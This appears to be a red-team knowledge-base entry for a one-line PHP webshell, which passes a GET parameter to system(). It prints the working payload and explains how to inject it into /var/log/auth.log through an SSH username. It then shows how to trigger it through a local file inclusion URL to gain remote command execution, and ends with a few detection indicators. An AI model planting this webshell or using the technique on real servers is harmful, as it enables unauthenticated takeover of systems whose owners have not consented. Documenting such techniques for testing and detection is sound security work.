---
id: a5103bea-74e9-4fb9-b53b-eaff62950f56
name: PHP-Webshell-System-Call
type: code
language: php
verified: true
created_at: '2023-04-06T03:55:58.577142+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Web
tags:
  - webshell
  - rce
  - php
validated: true
---

# PHP-Webshell-System-Call

## Code

```php
<?php system($_GET["cmd"]);?>
```

## Description

This PHP code snippet creates a simple one-liner webshell that executes any system command passed via the 'cmd' parameter in a GET request. When included and parsed by a PHP interpreter (e.g., via LFI into a log file), it allows arbitrary command execution on the server without authentication.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_GET["cmd"] | Command to execute on the server | id, whoami, ls -la |

## Usage

Embed this code into a log file (e.g., via SSH username injection) and access it through an LFI vulnerability like ?page=/var/log/auth.log&cmd=whoami. The output of the command will be displayed directly in the HTTP response. Use in red team scenarios for initial RCE after exploiting file inclusion flaws.

## Detection

- Web server logs showing unusual GET parameters like 'cmd' with shell commands.
- File integrity monitoring on logs detecting PHP code insertions.
- PHP execution logs (if enabled) capturing system() calls from unexpected files like auth.log.
- Network traffic analysis for LFI patterns traversing to /var/log/ paths.

## Related

- [[procedures/LFI-to-RCE-via-SSH-Log-File-Inclusion]]
